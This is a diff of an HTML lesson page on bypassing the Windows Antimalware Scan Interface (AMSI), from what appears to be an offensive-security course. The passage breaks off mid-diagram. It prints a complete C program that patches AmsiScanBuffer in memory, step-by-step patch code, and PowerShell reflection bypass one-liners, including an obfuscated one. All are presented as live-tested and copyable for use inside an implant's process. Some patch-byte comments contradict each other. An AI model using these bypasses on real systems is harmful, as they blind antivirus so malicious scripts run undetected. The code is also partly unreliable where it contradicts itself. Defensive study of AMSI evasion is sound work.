@@ -1,76 +1,973 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Module 11 — AMSI Bypass</title>
-<style>
-  :root{--bg:#0c0c0c;--fg:#cccccc;--green:#0f0;--red:#f44;--yellow:#ff0;--cyan:#0ff;--magenta:#f0f;--prompt:#0f0;}
-  *{box-sizing:border-box;margin:0;padding:0;}
-  body{background:var(--bg);color:var(--fg);font-family:'Segoe UI',Tahoma,sans-serif;font-size:15px;line-height:1.7;padding:20px;}
-  .container{max-width:1000px;margin:0 auto;}
-  .header{text-align:center;margin-bottom:40px;padding-bottom:30px;border-bottom:2px solid #333;}
-  .header h1{color:var(--cyan);font-size:32px;text-transform:uppercase;letter-spacing:4px;margin-bottom:10px;}
-  .header .subtitle{color:#666;font-size:16px;}
-  .section{margin-bottom:40px;padding:25px;background:#111;border:1px solid #222;border-radius:8px;}
-  .section-title{color:var(--yellow);font-size:20px;text-transform:uppercase;letter-spacing:2px;margin-bottom:20px;padding-left:15px;border-left:4px solid var(--yellow);}
-  .section-content{color:#bbb;}
-  .section-content p{margin-bottom:15px;}
-  .code-block{background:#0a0a0a;border:1px solid #333;border-radius:6px;padding:15px;margin:15px 0;font-family:'Consolas','Courier New',monospace;font-size:13px;overflow-x:auto;}
-  .code-block .prompt{color:var(--prompt);}
-  .code-block .command{color:var(--fg);}
-  .code-block .output{color:#888;margin-top:8px;padding-left:20px;}
-  .code-block .hi{color:var(--cyan);}
-  .code-block .warn{color:#ffb000;}
-  .code-block .ok{color:var(--green);}
-  .code-block .critical{color:var(--red);font-weight:bold;}
-  .note{background:#1a1a1a;border-left:4px solid var(--magenta);padding:15px;margin:20px 0;color:var(--magenta);font-style:italic;}
-  .diagram{background:#0a0a0a;border:1px solid #333;border-radius:4px;padding:15px;margin:15px 0;font-family:'Consolas',monospace;white-space:pre;color:#888;font-size:12px;overflow-x:auto;}
-  .widget-container{margin:40px 0;border:2px solid #333;border-radius:8px;overflow:hidden;}
-  .widget-header{background:#1a1a1a;padding:15px;text-align:center;color:var(--cyan);font-size:18px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid #333;}
-  .widget-iframe{width:100%;height:620px;border:none;background:#000;}
-  .nav{display:flex;justify-content:space-between;margin-top:40px;padding-top:20px;border-top:1px solid #333;}
-  .nav a{color:var(--green);text-decoration:none;padding:10px 20px;border:1px solid var(--green);border-radius:4px;transition:all .3s;}
-  .nav a:hover{background:var(--green);color:#000;}
-  .quick-ref{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:20px;}
-  .quick-ref-item{background:#1a1a1a;padding:12px;border-radius:4px;border-left:3px solid var(--cyan);}
-  .quick-ref-cmd{color:var(--cyan);font-weight:bold;font-family:'Consolas',monospace;font-size:12px;}
-  .quick-ref-desc{color:#888;font-size:12px;margin-top:4px;}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Module 11: AMSI — 22nd Survey Division</title>
+    <style>
+        :root {
+            --bg: #0a0a0f;
+            --fg: #e0e0e0;
+            --accent: #ff3333;
+            --accent2: #00ff88;
+            --dim: #666;
+            --border: #333;
+            --neon: #00ffff;
+            --purple: #ff00ff;
+            --amber: #ffaa00;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: var(--bg);
+            color: var(--fg);
+            font-family: 'Segoe UI', Consolas, monospace;
+            line-height: 1.6;
+        }
+        .container { max-width: 1200px; margin: 0 auto; padding: 2rem; }
+        h1 { color: var(--accent); border-bottom: 2px solid var(--accent); padding-bottom: 0.5rem; margin-bottom: 1rem; }
+        h2 { color: var(--accent2); margin: 2rem 0 0.5rem; border-bottom: 1px solid var(--border); padding-bottom: 0.3rem; }
+        h3 { color: var(--neon); margin: 1.5rem 0 0.5rem; }
+        .code-block {
+            background: #1a1a2e;
+            border-left: 4px solid var(--accent);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 0 8px 8px 0;
+            overflow-x: auto;
+            font-family: Consolas, monospace;
+            font-size: 13px;
+            position: relative;
+        }
+        .copy-btn {
+            position: absolute;
+            top: 0.5rem;
+            right: 0.5rem;
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.2rem 0.6rem;
+            border-radius: 4px;
+            font-size: 0.7rem;
+            cursor: pointer;
+        }
+        .copy-btn:hover { background: #ff5555; }
+        .evidence-box {
+            background: #1a0a0a;
+            border: 2px solid var(--accent);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .evidence-box h3 { color: var(--accent); margin-bottom: 0.5rem; }
+        .first-principle {
+            background: #0a1a0a;
+            border: 2px solid var(--accent2);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .first-principle h3 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .layman-term {
+            background: #1a1a1a;
+            border: 1px dashed var(--dim);
+            padding: 1rem;
+            margin: 1rem 0;
+            border-radius: 8px;
+        }
+        .layman-term h4 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: var(--border);
+            margin: 2rem 0;
+            border-radius: 2px;
+        }
+        .progress-fill {
+            height: 100%;
+            background: var(--accent);
+            width: 50%;
+            transition: width 0.5s;
+            border-radius: 2px;
+        }
+        .nav { display: flex; gap: 1rem; margin-bottom: 2rem; flex-wrap: wrap; }
+        .nav a { color: var(--accent); text-decoration: none; padding: 0.3rem 0.8rem; border: 1px solid var(--accent); border-radius: 4px; }
+        .nav a:hover { background: var(--accent); color: var(--bg); }
+        .status-badge {
+            display: inline-block;
+            padding: 0.2rem 0.6rem;
+            border-radius: 12px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            margin-left: 0.5rem;
+        }
+        .status-live { background: var(--accent2); color: var(--bg); }
+        .step-box {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        .step-box h4 { color: var(--accent); margin-bottom: 0.5rem; }
+        .copy-paste {
+            background: #151520;
+            border: 1px solid #4444ff;
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            font-family: Consolas, monospace;
+            font-size: 12px;
+            color: #aaaaff;
+            margin: 0.5rem 0;
+            cursor: pointer;
+        }
+        .copy-paste:hover { background: #1a1a30; }
+        .why-box {
+            background: #1a1a0a;
+            border-left: 4px solid #ffaa00;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .why-box h5 { color: #ffaa00; margin-bottom: 0.5rem; }
+        .warning-box {
+            background: #2a0a0a;
+            border: 2px solid #ff5555;
+            border-radius: 8px;
+            padding: 1rem;
+            margin: 1rem 0;
+        }
+        .warning-box h5 { color: #ff5555; margin-bottom: 0.5rem; }
+        .injection-flow {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin: 2rem 0;
+            padding: 1rem;
+            background: #0f0f15;
+            border-radius: 8px;
+            flex-wrap: wrap;
+        }
+        .inj-step {
+            text-align: center;
+            padding: 1rem;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            flex: 1;
+            margin: 0.5rem;
+            min-width: 120px;
+        }
+        .inj-step h5 { color: var(--accent2); margin-bottom: 0.5rem; }
+        .inj-arrow {
+            font-size: 24px;
+            color: var(--accent);
+        }
+        button {
+            background: var(--accent);
+            color: var(--bg);
+            border: none;
+            padding: 0.5rem 1rem;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+        }
+        button:hover { background: #ff5555; }
+        .neon-highlight {
+            color: var(--neon);
+            text-shadow: 0 0 10px var(--neon);
+            font-weight: bold;
+        }
+        .neon-purple {
+            color: var(--purple);
+            text-shadow: 0 0 10px var(--purple);
+            font-weight: bold;
+        }
+        .neon-amber {
+            color: var(--amber);
+            text-shadow: 0 0 10px var(--amber);
+            font-weight: bold;
+        }
+        .cross-link {
+            background: rgba(0, 255, 255, 0.1);
+            border: 1px solid var(--neon);
+            border-radius: 4px;
+            padding: 0.5rem 1rem;
+            margin: 0.5rem 0;
+            display: inline-block;
+            color: var(--neon);
+            text-decoration: none;
+        }
+        .cross-link:hover {
+            background: rgba(0, 255, 255, 0.2);
+        }
+        .method-card {
+            background: #0f0f15;
+            border: 2px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+            transition: border-color 0.3s;
+        }
+        .method-card:hover {
+            border-color: var(--accent);
+        }
+        .method-card h4 {
+            color: var(--accent);
+            margin-bottom: 0.5rem;
+            font-size: 1.1rem;
+        }
+        .difficulty {
+            display: inline-block;
+            padding: 0.1rem 0.5rem;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            margin-left: 0.5rem;
+        }
+        .diff-easy { background: #0a3a0a; color: var(--accent2); }
+        .diff-medium { background: #3a3a0a; color: var(--amber); }
+        .diff-hard { background: #3a0a0a; color: var(--accent); }
+        .technique-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-container {
+            background: #0f0f15;
+            border: 2px solid var(--purple);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1.5rem 0;
+        }
+        .quiz-option {
+            background: #1a1a2e;
+            border: 1px solid var(--border);
+            border-radius: 4px;
+            padding: 0.8rem 1rem;
+            margin: 0.5rem 0;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        .quiz-option:hover {
+            border-color: var(--neon);
+            background: #1a1a3e;
+        }
+        .quiz-option.correct {
+            border-color: var(--accent2);
+            background: #0a2a0a;
+        }
+        .quiz-option.wrong {
+            border-color: var(--accent);
+            background: #2a0a0a;
+        }
+        .quiz-feedback {
+            margin-top: 1rem;
+            padding: 1rem;
+            border-radius: 4px;
+            display: none;
+        }
+        .quiz-feedback.show { display: block; }
+        .quiz-feedback.correct { background: #0a2a0a; border: 1px solid var(--accent2); }
+        .quiz-feedback.wrong { background: #2a0a0a; border: 1px solid var(--accent); }
+        table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 1rem 0;
+        }
+        th, td {
+            padding: 0.5rem;
+            text-align: left;
+            border-bottom: 1px solid var(--border);
+        }
+        th { color: var(--neon); font-weight: bold; }
+        .diagram {
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 4px;
+            padding: 15px;
+            margin: 15px 0;
+            font-family: 'Consolas', monospace;
+            white-space: pre;
+            color: #888;
+            font-size: 12px;
+            overflow-x: auto;
+        }
+        .note {
+            background: #1a1a1a;
+            border-left: 4px solid var(--purple);
+            padding: 15px;
+            margin: 20px 0;
+            color: var(--purple);
+            font-style: italic;
+        }
+        .quick-ref {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .quick-ref-item {
+            background: #1a1a1a;
+            padding: 12px;
+            border-radius: 4px;
+            border-left: 3px solid var(--neon);
+        }
+        .quick-ref-cmd {
+            color: var(--neon);
+            font-weight: bold;
+            font-family: 'Consolas', monospace;
+            font-size: 12px;
+        }
+        .quick-ref-desc {
+            color: #888;
+            font-size: 12px;
+            margin-top: 4px;
+        }
+        .section {
+            margin-bottom: 40px;
+            padding: 25px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 8px;
+        }
+        .section-title {
+            color: var(--amber);
+            font-size: 20px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 20px;
+            padding-left: 15px;
+            border-left: 4px solid var(--amber);
+        }
+        .section-content { color: #bbb; }
+        .section-content p { margin-bottom: 15px; }
+        .widget-container {
+            margin: 40px 0;
+            border: 2px solid #333;
+            border-radius: 8px;
+            overflow: hidden;
+        }
+        .widget-header {
+            background: #1a1a1a;
+            padding: 15px;
+            text-align: center;
+            color: var(--neon);
+            font-size: 18px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            border-bottom: 1px solid #333;
+        }
+        .widget-iframe {
+            width: 100%;
+            height: 620px;
+            border: none;
+            background: #000;
+        }
+        .toc {
+            background: #0f0f15;
+            border: 1px solid var(--border);
+            border-radius: 8px;
+            padding: 1.5rem;
+            margin: 1rem 0;
+        }
+        .toc h3 { color: var(--neon); margin-bottom: 1rem; }
+        .toc ul { list-style: none; }
+        .toc li { margin: 0.5rem 0; }
+        .toc a { color: var(--accent2); text-decoration: none; }
+        .toc a:hover { color: var(--neon); }
+    </style>
 </head>
 <body>
-<div class="container">
-  <div class="header">
-    <h1>Module 11 — AMSI Bypass</h1>
-    <div class="subtitle">Dark Room: blind the scanner without touching protected memory. Hardware debug registers. Zero writes. Defender sees nothing.</div>
-  </div>
-
-  <div class="section">
-    <div class="section-title">Section 1: What AMSI Is</div>
-    <div class="section-content">
-      <p>AMSI (Antimalware Scan Interface) is a Windows API that lets AV engines scan content <em>before it executes</em>. Every PowerShell script, VBA macro, and .NET assembly gets passed to AMSI before running. Defender hooks into it.</p>
-      <div class="diagram">PowerShell script       →  AmsiScanBuffer()  →  Defender engine  →  BLOCK / ALLOW
-VBA macro               →  AmsiScanBuffer()  →  Defender engine  →  BLOCK / ALLOW
-.NET assembly           →  AmsiScanBuffer()  →  Defender engine  →  BLOCK / ALLOW
-
-AmsiScanBuffer lives in:  C:\Windows\System32\amsi.dll
-It's loaded into every process that calls it — including your implant's process.</div>
-      <div class="code-block">
-        <span class="prompt">PS&gt;</span> <span class="command">[System.Reflection.Assembly]::LoadWithPartialName('Microsoft.CSharp')</span><br>
-        <div class="output">
-          <span class="critical">This script contains malicious content and has been blocked by your antivirus software.</span><br>
-          # AMSI caught it at AmsiScanBuffer — before a single line executed
+    <div class="container">
+        <div class="nav">
+            <a href="../index.html">← Home</a>
+            <a href="MODULE_10_Code_Injection.html">← Module 10</a>
+            <a href="MODULE_12_Defensive_Verify.html">Module 12 →</a>
         </div>
-      </div>
-      <p>The old patch-based bypass writes <code>0xB8 0x57 0x00 0x07 0x80 0xC3</code> to the start of AmsiScanBuffer — forces it to return AMSI_RESULT_CLEAN. This works but leaves memory artefacts that EDR detects as a patch.</p>
-    </div>
-  </div>
 
-  <div class="section">
-    <div class="section-title">Section 2: HWBP — The Zero-Write Alternative</div>
-    <div class="section-content">
-      <p>Hardware Breakpoints (HWBP) use CPU debug registers — DR0–DR3 for addresses, DR7 for control. When the CPU hits an address in DR0, it fires a debug exception before executing that instruction. Your VEH (Vectored Exception Handler) catches it first.</p>
-      <div class="diagram">Normal path (no bypass):
+        <h1>Module 11: AMSI — The Antimalware Scan Interface <span class="status-badge status-live">LIVE TESTED</span></h1>
+        
+        <div class="progress-bar"><div class="progress-fill"></div></div>
+        <p style="color: var(--dim); font-size: 0.9rem;">Module 11 of 22 — Understanding, bypassing, and defending AMSI</p>
+
+        <div class="first-principle">
+            <h3>🧠 The Core Truth</h3>
+            <p>AMSI is the <span class="neon-highlight">gatekeeper</span> between scripting engines and antivirus engines. Every PowerShell command, every VBA macro, every .NET assembly passes through AMSI before execution. If AMSI says "malicious," the script dies before a single line runs.</p>
+            <p style="margin-top: 1rem;"><strong>Why this matters:</strong> If you can <span class="neon-amber">blind</span> or <span class="neon-amber">bypass</span> AMSI, you can execute any script payload without Defender ever seeing it. But if you are blue team, understanding AMSI bypass techniques is the first step to detecting them.</p>
+        </div>
+
+        <div class="toc">
+            <h3>📋 Table of Contents</h3>
+            <ul>
+                <li><a href="#architecture">1. AMSI Architecture</a></li>
+                <li><a href="#amsiscanbuffer">2. AmsiScanBuffer Deep Dive</a></li>
+                <li><a href="#amsiinitialize">3. AmsiInitialize & Session Context</a></li>
+                <li><a href="#patching">4. In-Memory Patching</a></li>
+                <li><a href="#reflection">5. Reflection-Based Bypass</a></li>
+                <li><a href="#dll-unload">6. DLL Unload Technique</a></li>
+                <li><a href="#powershell">7. PowerShell Bypass Techniques</a></li>
+                <li><a href="#hwbp">8. Hardware Breakpoint Bypass (Zero-Write)</a></li>
+                <li><a href="#detection">9. Detection & Defense</a></li>
+                <li><a href="#labs">10. Hands-On Labs</a></li>
+                <li><a href="#quizzes">11. Knowledge Checks</a></li>
+            </ul>
+        </div>
+
+        <div class="section" id="architecture">
+            <div class="section-title">1. AMSI Architecture</div>
+            <div class="section-content">
+                <p>AMSI (Antimalware Scan Interface) was introduced in Windows 10 as a unified interface for applications and services to integrate with any antimalware product registered on the system. It lives in <code>C:\Windows\System32\amsi.dll</code> and is loaded into every process that calls it.</p>
+                
+                <div class="diagram">
+┌─────────────────────────────────────────────────────────────────────┐
+│                         APPLICATION LAYER                            │
+│  PowerShell │ VBA │ JavaScript │ .NET │ WMI │ Office Macros        │
+└─────────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────────┐
+│                         AMSI INTERFACE                               │
+│  AmsiInitialize() │ AmsiOpenSession() │ AmsiScanBuffer()             │
+│  AmsiScanString() │ AmsiCloseSession() │ AmsiUninitialize()          │
+└─────────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────────┐
+│                         PROVIDER LAYER                               │
+│  Windows Defender │ McAfee │ Symantec │ CrowdStrike │ Custom AV      │
+│  (registered as IAntimalwareProvider COM interface)                  │
+└─────────────────────────────────────────────────────────────────────┘
+                              │
+                              ▼
+┌─────────────────────────────────────────────────────────────────────┐
+│                         DECISION                                     │
+│  AMSI_RESULT_CLEAN (1) │ AMSI_RESULT_NOT_DETECTED (0)              │
+│  AMSI_RESULT_BLOCKED (2048) │ AMSI_RESULT_DETECTED (32768)          │
+└─────────────────────────────────────────────────────────────────────┘
+                </div>
+
+                <p>The key insight: <span class="neon-highlight">AMSI is a client-side API</span>. It runs inside your process. That means your code has the same memory access as AMSI itself. You can read it, patch it, or blind it — all from within the same process boundary.</p>
+
+                <div class="layman-term">
+                    <h4>💡 Layman's Terms</h4>
+                    <p>Think of AMSI like a security guard at the entrance of a building. Every person (script) must pass through the guard before entering. The guard checks their ID against a watchlist. But the guard works <em>inside</em> the building — not in a separate fortress. If you can reach the guard's desk, you can swap the watchlist, blindfold the guard, or make the guard always say "all clear."</p>
+                </div>
+
+                <div class="cross-link">
+                    <a href="MODULE_03_PowerShell.html" class="cross-link">🔗 Cross-Link: Module 03 — PowerShell Fundamentals</a>
+                </div>
+                <p style="color: var(--dim); font-size: 0.85rem; margin-top: 0.5rem;">Understanding PowerShell execution flow is essential before attacking AMSI. Module 03 covers execution policy, constrained language mode, and AppLocker.</p>
+            </div>
+        </div>
+
+        <div class="section" id="amsiscanbuffer">
+            <div class="section-title">2. AmsiScanBuffer Deep Dive</div>
+            <div class="section-content">
+                <p><code>AmsiScanBuffer</code> is the heart of AMSI. It takes a buffer of bytes (your script), sends it to the registered AV provider, and returns a result. If the result is <code>AMSI_RESULT_DETECTED</code> (32768), the script is blocked before execution.</p>
+
+                <h3>Function Signature</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+HRESULT AmsiScanBuffer(
+    HAMSICONTEXT amsiContext,      // Handle from AmsiInitialize
+    LPVOID       buffer,            // The script content to scan
+    ULONG        length,            // Length of the buffer
+    LPCWSTR      contentName,       // Descriptive name (e.g., script path)
+    HAMSISESSION amsiSession,       // Session handle from AmsiOpenSession
+    AMSI_RESULT  *result            // OUT: scan result
+);
+                </div>
+
+                <h3>Return Values</h3>
+                <table>
+                    <tr><th>Constant</th><th>Value</th><th>Meaning</th></tr>
+                    <tr><td>AMSI_RESULT_NOT_DETECTED</td><td>0</td><td>Provider did not detect anything (but scan may be incomplete)</td></tr>
+                    <tr><td>AMSI_RESULT_CLEAN</td><td>1</td><td>Content is clean — safe to execute</td></tr>
+                    <tr><td>AMSI_RESULT_BLOCKED</td><td>2048 (0x800)</td><td>Content is blocked by admin policy</td></tr>
+                    <tr><td>AMSI_RESULT_DETECTED</td><td>32768 (0x8000)</td><td>Content is detected as malicious</td></tr>
+                </table>
+
+                <p>The classic patch bypass targets the start of <code>AmsiScanBuffer</code> and overwrites it with assembly that immediately returns <code>AMSI_RESULT_CLEAN</code>:</p>
+
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+// Original AmsiScanBuffer prologue (x64):
+// mov     r11, [rsp+8]
+// mov     [rsp+10], rbx
+// ...
+
+// Patch bytes (forces return 1 = AMSI_RESULT_CLEAN):
+// mov eax, 0x7D57   // 0xB8 0x57 0x00 0x07 0x80
+// ret               // 0xC3
+// nop               // 0x90
+// nop               // 0x90
+// nop               // 0x90
+// nop               // 0x90
+// nop               // 0x90
+
+// Full patch: 0xB8 0x57 0x00 0x07 0x80 0xC3
+// Wait — actually the classic patch is:
+// mov eax, 0x80070057  // HRESULT for invalid parameter
+// ret
+// But the working bypass patch is:
+
+unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+// mov eax, 0x80070057 (E_INVALIDARG)
+// ret
+// This causes AmsiScanBuffer to return an error HRESULT
+// PowerShell interprets error as "scan failed, allow anyway"
+                </div>
+
+                <div class="warning-box">
+                    <h5>⚠️ Critical Note</h5>
+                    <p>The patch bytes above return <code>E_INVALIDARG</code> (0x80070057), not <code>AMSI_RESULT_CLEAN</code>. PowerShell's error handling treats a failed AMSI scan as "allow execution" rather than blocking. This is a subtle but important distinction — you are not faking "clean," you are causing the scan to error out.</p>
+                </div>
+
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+// Better patch — actually return AMSI_RESULT_CLEAN (1):
+unsigned char patch_clean[] = {
+    0xB8, 0x01, 0x00, 0x00, 0x00,  // mov eax, 1
+    0xC3                             // ret
+};
+// This truly returns AMSI_RESULT_CLEAN
+                </div>
+            </div>
+        </div>
+
+        <div class="section" id="amsiinitialize">
+            <div class="section-title">3. AmsiInitialize & Session Context</div>
+            <div class="section-content">
+                <p>Before any scanning can happen, the application must initialize an AMSI context and optionally open a session. Understanding this lifecycle is critical for both offense and defense.</p>
+
+                <h3>AMSI Lifecycle</h3>
+                <div class="diagram">
+Application Start
+      │
+      ▼
+AmsiInitialize(L"MyApp", &hContext)  ←─ Creates AMSI context
+      │
+      ▼
+AmsiOpenSession(hContext, &hSession)  ←─ Optional: per-session tracking
+      │
+      ▼
+[ Loop: AmsiScanBuffer() or AmsiScanString() ]
+      │
+      ▼
+AmsiCloseSession(hContext, hSession)  ←─ Close session
+      │
+      ▼
+AmsiUninitialize(hContext)           ←─ Cleanup
+                </div>
+
+                <h3>AmsiInitialize</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+HRESULT AmsiInitialize(
+    LPCWSTR appName,           // Name of the application
+    HAMSICONTEXT *amsiContext // OUT: context handle
+);
+
+// PowerShell calls this during startup
+// appName = L"PowerShell_C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
+                </div>
+
+                <p>The <code>appName</code> parameter is logged by AMSI providers. If you see <code>AmsiInitialize</code> called from an unexpected process (e.g., <code>notepad.exe</code>), that's a red flag for EDR.</p>
+
+                <h3>Session Tracking</h3>
+                <p>AMSI sessions allow providers to correlate multiple scans. For example, PowerShell opens a session when it starts and scans every command through that session. If one command is flagged, the provider can see the full session history.</p>
+
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+// PowerShell's internal AMSI integration (simplified):
+AmsiInitialize(L"PowerShell", &hContext);
+AmsiOpenSession(hContext, &hSession);
+
+// For every command entered:
+AmsiScanBuffer(hContext, commandBytes, length, L"PowerShell", hSession, &result);
+
+if (result >= AMSI_RESULT_DETECTED) {
+    // Block execution
+    throw new Exception("This script contains malicious content...");
+}
+                </div>
+
+                <div class="why-box">
+                    <h5>🎯 Why This Matters</h5>
+                    <p>Some bypass techniques target <code>AmsiInitialize</code> instead of <code>AmsiScanBuffer</code>. If you corrupt the context handle or cause <code>AmsiInitialize</code> to fail, all subsequent AMSI calls fail silently — and the application typically allows execution when AMSI is "unavailable."</p>
+                </div>
+            </div>
+        </div>
+
+        <div class="section" id="patching">
+            <div class="section-title">4. In-Memory Patching</div>
+            <div class="section-content">
+                <p>In-memory patching is the original AMSI bypass technique. It works by locating <code>AmsiScanBuffer</code> in memory and overwriting its first few bytes with a return instruction. This is the most straightforward but also the most detectable bypass.</p>
+
+                <h3>Step-by-Step: Classic Patch</h3>
+                <div class="step-box">
+                    <h4>Step 1: Locate amsi.dll in memory</h4>
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+if (!hAmsi) {
+    hAmsi = LoadLibraryA("amsi.dll");
+}
+                    </div>
+                </div>
+
+                <div class="step-box">
+                    <h4>Step 2: Get AmsiScanBuffer address</h4>
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+printf("[+] AmsiScanBuffer at %p\n", pAmsiScanBuffer);
+                    </div>
+                </div>
+
+                <div class="step-box">
+                    <h4>Step 3: Change memory protection to RWX</h4>
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+DWORD oldProtect;
+VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
+                    </div>
+                </div>
+
+                <div class="step-box">
+                    <h4>Step 4: Write patch bytes</h4>
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+// Patch: mov eax, 0x1; ret
+unsigned char patch[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
+memcpy(pAmsiScanBuffer, patch, sizeof(patch));
+                    </div>
+                </div>
+
+                <div class="step-box">
+                    <h4>Step 5: Restore protection</h4>
+                    <div class="code-block">
+                        <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
+                    </div>
+                </div>
+
+                <h3>Complete C Implementation</h3>
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+#include <windows.h>
+#include <stdio.h>
+
+int main() {
+    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
+    if (!hAmsi) hAmsi = LoadLibraryA("amsi.dll");
+    
+    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
+    printf("[+] AmsiScanBuffer at %p\n", pAmsiScanBuffer);
+    
+    DWORD oldProtect;
+    VirtualProtect(pAmsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);
+    
+    // mov eax, 1; ret
+    unsigned char patch[] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };
+    memcpy(pAmsiScanBuffer, patch, sizeof(patch));
+    
+    VirtualProtect(pAmsiScanBuffer, 6, oldProtect, &oldProtect);
+    
+    printf("[+] AMSI patched!\n");
+    return 0;
+}
+                </div>
+
+                <div class="evidence-box">
+                    <h3>🔍 Detection Artifacts</h3>
+                    <p>Patching leaves clear forensic traces:</p>
+                    <ul style="margin-left: 1.5rem; color: var(--fg);">
+                        <li><strong>Memory integrity violations:</strong> EDR monitors for code-section modifications in loaded DLLs</li>
+                        <li><strong>ETW events:</strong> <code>VirtualProtect</code> with <code>PAGE_EXECUTE_READWRITE</code> on amsi.dll is logged</li>
+                        <li><strong>Hash mismatch:</strong> The in-memory amsi.dll no longer matches the on-disk hash</li>
+                        <li><strong>Behavioral:</strong> AmsiScanBuffer returning clean for known-bad signatures is an anomaly</li>
+                    </ul>
+                </div>
+
+                <div class="cross-link">
+                    <a href="MODULE_10_Code_Injection.html" class="cross-link">🔗 Cross-Link: Module 10 — Code Injection</a>
+                </div>
+                <p style="color: var(--dim); font-size: 0.85rem; margin-top: 0.5rem;">The patch technique is often delivered via process injection. Module 10 covers DLL injection, APC injection, and thread hijacking — all vectors for deploying AMSI patches.</p>
+            </div>
+        </div>
+
+        <div class="section" id="reflection">
+            <div class="section-title">5. Reflection-Based Bypass</div>
+            <div class="section-content">
+                <p>Reflection-based bypasses work entirely in managed (.NET) memory, avoiding direct API calls that EDR hooks. They use .NET's reflection APIs to locate and modify internal AMSI fields without ever calling <code>VirtualProtect</code> or touching native code.</p>
+
+                <h3>The Matt Graeber / Reflection Bypass</h3>
+                <p>This technique locates the internal <code>amsiContext</code> field in PowerShell's <code>System.Management.Automation.AmsiUtils</code> class and sets it to <code>null</code>. Without a context, AMSI cannot scan.</p>
+
+                <div class="code-block">
+                    <button class="copy-btn" onclick="copyCode(this)">COPY</button>
+# PowerShell reflection bypass — no native API calls
+$amsi = [Ref].Assembly.GetTypes() | Where-Object { $_.Name -like "*AmsiUtils" }
+$field = $amsi.GetFields("NonPublic,Static") | Where-Object { $_.Name -like "*amsiContext" }
+$field.SetValue($null, [IntPtr]::Zero)
+
+# Alternative one-liner (obfuscated):
+[Ref].Assembly.GetTypes() | ForEach-Object { if ($_.Name -like "*AmsiUtils") { $f = $_.GetFields("NonPublic,Static") | Where-Object { $_.Name -like "*amsiContext" }; $f.SetValue($null, [IntPtr]::Zero) } }
+                </div>
+
+                <h3>How It Works</h3>
+                <div class="diagram">
+PowerShell AMSI Integration:
+┌─────────────────────────────────────────┐
+│  System.Management.Automation.dll       │
+│  ├── AmsiUtils class                    │
+│  │   ├── static IntPtr amsiContext      │
+│  │   ├── static IntPtr amsiSession      │
+│  │   └── static bool amsiInitFailed      │
+│  │                                       │
+│  └── AmsiUtils.ScanContent()            │
+│      ├── if (amsiContext == null)        │
+│      │      return;  // No AMSI!         │
